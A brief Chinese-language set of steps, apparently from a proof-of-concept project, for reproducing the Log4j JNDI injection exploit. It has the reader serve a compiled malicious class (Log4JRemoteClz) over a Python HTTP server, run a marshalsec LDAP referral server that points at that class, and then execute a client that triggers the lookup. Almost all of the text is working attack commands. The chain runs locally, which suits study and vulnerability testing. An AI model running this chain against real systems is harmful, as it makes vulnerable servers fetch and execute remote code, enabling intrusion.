
1) 启动Http Server
cd到`Log4JRemoteClz.class`编译后所在target路径，执行
`python -m SimpleHTTPServer 8888`

2) 启动JNDI Ref Server
cd到`resources`路径，执行
`java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8888/#Log4JRemoteClz`

3) 执行ClientRun.java代码
